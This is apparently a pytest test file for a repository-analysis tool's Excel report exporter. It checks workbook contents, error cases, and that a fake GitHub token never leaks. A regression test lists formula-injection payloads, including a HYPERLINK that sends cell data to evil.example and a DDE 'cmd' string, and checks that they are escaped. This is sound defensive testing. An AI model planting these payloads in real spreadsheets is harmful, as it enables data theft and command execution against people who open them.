"""
Phase 14: Excel Reporting Integration tests.

Builds a real Repository/AnalysisRun through the same Phase 9 DAO the API
layer uses (no RepositoryContext, no GitHub calls), then asserts the
generated workbook contains the expected repository facts and, per this
phase's explicit task, that no credential-shaped value ever appears in it
-- verified by configuring a fake GITHUB_TOKEN-like secret nearby and
scanning every cell of every sheet for it.
"""

from __future__ import annotations

from datetime import datetime, timezone

import openpyxl
import pytest

from app.core.config import Settings
from app.db.repository_dao import (
    complete_analysis_run,
    create_analysis_run,
    transition_analysis_run,
    upsert_repository,
)
from app.domain.errors import AnalysisNotReadyError, RepositoryNotFoundError
from app.domain.models import RepositoryMetadata
from app.domain.repository_context import IngestionStatus
from app.reporting.excel_export import build_repository_workbook, save_repository_workbook

FAKE_TOKEN = "ghp_ThisIsAFakeSecretTokenValue1234567890"  # nosec - test fixture only

PROFILE = {
    "languages": {"Python": 8000, "HTML": 1500, "CSS": 500},
    "test_frameworks": ["pytest"],
    "test_directories": ["tests"],
    "dependencies": ["fastapi", "pytest"],
    "file_inventory": {"total_files": 125, "total_size_bytes": 3_600_000, "by_category": {"source": 80}},
    "git_history_summary": {"commit_count": 200, "most_recent_commit_at": "2024-06-01T12:30:00+00:00"},
}


def make_ready_run(db_session, **repo_overrides):
    settings = Settings(github_token=FAKE_TOKEN)  # proves the exporter never touches this
    assert settings.has_github_token()

    repository = upsert_repository(
        db_session,
        provider="github",
        owner="octocat",
        name="hello-world",
        source_url="https://github.com/octocat/hello-world",
        metadata=RepositoryMetadata(
            **{
                "repository_id": "123456",
                "name": "hello-world",
                "owner": "octocat",
                "description": "My first repository",
                "default_branch": "main",
                "visibility": "public",
                "primary_language": "Python",
                "stargazers_count": 42,
                "forks_count": 7,
                **repo_overrides,
            }
        ),
    )
    run = create_analysis_run(
        db_session,
        repository,
        branch_name="main",
        commit_sha="abc123def456",
        config_snapshot={"max_commit_history": 200},
    )
    for status in (
        IngestionStatus.VALIDATING,
        IngestionStatus.FETCHING_METADATA,
        IngestionStatus.FETCHING_BRANCHES,
        IngestionStatus.CLONING,
        IngestionStatus.SCANNING,
    ):
        transition_analysis_run(db_session, run, status)
    complete_analysis_run(db_session, run, result_profile=PROFILE)
    run.completed_at = datetime(2024, 6, 2, 8, 0, 0, tzinfo=timezone.utc)
    db_session.commit()
    return repository, run


def test_workbook_contains_expected_repository_fields(db_session):
    repository, run = make_ready_run(db_session)

    workbook = build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)

    sheet = workbook["Repository"]
    fields = {row[0].value: row[1].value for row in sheet.iter_rows(min_row=2)}

    assert fields["Repository URL"] == "https://github.com/octocat/hello-world"
    assert fields["Provider"] == "github"
    assert fields["Owner"] == "octocat"
    assert fields["Repository Name"] == "hello-world"
    assert fields["Selected Branch"] == "main"
    assert fields["Commit SHA"] == "abc123def456"
    assert fields["Primary Language"] == "Python"
    # SQLite doesn't round-trip tzinfo on DateTime columns, so only assert
    # the naive timestamp matches (Postgres would preserve "+00:00" too).
    assert fields["Analysis Timestamp"].startswith("2024-06-02T08:00:00")
    assert fields["Status"] == "READY"
    assert fields["Description"] == "My first repository"
    assert fields["Stargazers"] == 42
    assert fields["Forks"] == 7
    assert fields["Total Files"] == 125
    assert fields["Total Size (bytes)"] == 3_600_000
    assert fields["Commits Analyzed"] == 200
    assert fields["Analysis Run ID"] == run.id


def test_workbook_contains_language_distribution(db_session):
    repository, run = make_ready_run(db_session)

    workbook = build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)

    sheet = workbook["Languages"]
    rows = [tuple(cell.value for cell in row) for row in sheet.iter_rows(min_row=2)]

    assert rows[0] == ("Python", 8000, 80.0)  # sorted by byte count, descending
    assert rows[1] == ("HTML", 1500, 15.0)
    assert rows[2] == ("CSS", 500, 5.0)


def test_no_credential_or_secret_like_value_anywhere_in_workbook(db_session):
    repository, run = make_ready_run(db_session)

    workbook = build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)

    all_values: list[str] = []
    for sheet in workbook.worksheets:
        for row in sheet.iter_rows():
            for cell in row:
                if cell.value is not None:
                    all_values.append(str(cell.value))

    joined = "\n".join(all_values)
    assert FAKE_TOKEN not in joined

    forbidden_substrings = ("token", "secret", "password", "authorization", "bearer")
    for sheet in workbook.worksheets:
        header_row = next(sheet.iter_rows(min_row=1, max_row=1))
        for cell in header_row:
            if cell.value:
                lowered = str(cell.value).lower()
                assert not any(s in lowered for s in forbidden_substrings)
        # field names in the "Field" column of the Repository sheet
        if sheet.title == "Repository":
            for row in sheet.iter_rows(min_row=2):
                field_name = str(row[0].value).lower()
                assert not any(s in field_name for s in forbidden_substrings)


def test_save_repository_workbook_writes_a_loadable_xlsx_file(db_session, tmp_path):
    repository, run = make_ready_run(db_session)
    output_path = tmp_path / "report.xlsx"

    save_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id, path=str(output_path))

    assert output_path.is_file()
    reloaded = openpyxl.load_workbook(output_path)
    assert reloaded.sheetnames == ["Repository", "Languages"]


def test_unknown_repository_raises_not_found(db_session):
    with pytest.raises(RepositoryNotFoundError):
        build_repository_workbook(db_session, repository_id="does-not-exist", analysis_run_id="also-missing")


def test_unknown_analysis_run_raises_not_found(db_session):
    repository = upsert_repository(
        db_session, provider="github", owner="octocat", name="hello-world", source_url="https://github.com/octocat/hello-world"
    )
    db_session.commit()
    with pytest.raises(RepositoryNotFoundError):
        build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id="does-not-exist")


def test_non_ready_run_raises_analysis_not_ready(db_session):
    repository = upsert_repository(
        db_session, provider="github", owner="octocat", name="hello-world", source_url="https://github.com/octocat/hello-world"
    )
    run = create_analysis_run(
        db_session, repository, branch_name="main", commit_sha=None, config_snapshot={}
    )
    db_session.commit()

    with pytest.raises(AnalysisNotReadyError):
        build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)


# ---- Regression: CSV/Excel formula injection via untrusted repo data ----
# repository.description is free text entirely controlled by whoever owns
# the GitHub repo being analyzed -- no character restrictions. openpyxl
# treats any string cell value starting with '=' (also '+', '-', '@') as a
# live formula, not plain text (see app/reporting/excel_export.py). Without
# sanitization, a malicious repository description becomes an executable
# formula the moment someone opens the exported workbook in Excel.


@pytest.mark.parametrize(
    "malicious_description",
    [
        '=HYPERLINK("http://evil.example/steal?x="&A1,"Click me")',
        "=cmd|'/c calc'!A1",
        "+1+1",
        "-1+1",
        "@SUM(1+1)",
    ],
)
def test_malicious_description_never_becomes_a_live_formula_cell(db_session, malicious_description):
    repository, run = make_ready_run(db_session, description=malicious_description)

    workbook = build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)

    sheet = workbook["Repository"]
    description_cell = next(row[1] for row in sheet.iter_rows(min_row=2) if row[0].value == "Description")

    assert description_cell.data_type != "f"  # never stored as a formula
    assert description_cell.value == "'" + malicious_description  # visible as inert text


def test_run_belonging_to_different_repository_is_rejected(db_session):
    repo_a, run_a = make_ready_run(db_session)
    repo_b = upsert_repository(
        db_session, provider="github", owner="octocat", name="spoon-knife", source_url="https://github.com/octocat/spoon-knife"
    )
    db_session.commit()

    with pytest.raises(RepositoryNotFoundError):
        build_repository_workbook(db_session, repository_id=repo_b.id, analysis_run_id=run_a.id)
